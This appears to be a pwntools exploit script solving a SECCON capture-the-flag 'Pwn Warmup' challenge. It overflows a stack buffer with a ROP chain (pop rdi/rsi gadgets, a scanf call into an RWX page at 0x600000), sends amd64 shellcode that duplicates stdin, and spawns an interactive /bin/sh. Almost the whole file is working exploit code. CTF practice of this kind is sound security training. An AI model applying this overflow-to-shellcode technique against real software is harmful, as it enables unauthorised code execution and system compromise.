from pwn import *

elf = context.binary = ELF('./chall')

host = args.HOST or 'pwn-neko.chal.seccon.jp'
port = int(args.PORT or 9001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.recvuntil('Welcome to Pwn Warmup!\n')
rwx = p64(0x600000)
percent_s = p64(0x40081b)
POP_RDI = p64(0x00000000004007e3)
POP_RSI_POP_R15 = p64(0x00000000004007e1)
scanf = p64(elf.sym['__isoc99_scanf'])
whitespace = '\x0a\x0b\x20'

payload = 'A' * 40 + POP_RDI + percent_s + POP_RSI_POP_R15 + rwx + 'A' * 8 + scanf + rwx

assert all(c not in payload for c in whitespace)
io.sendline(payload)

# dup stdin, call shell
shellcode = asm(
    '''mov rax, 31
    inc rax
    xor rdi, rdi
    syscall
''' +
    shellcraft.amd64.linux.sh(),
    arch='amd64')

assert all(c not in shellcode for c in whitespace)
io.sendline(shellcode)
io.interactive()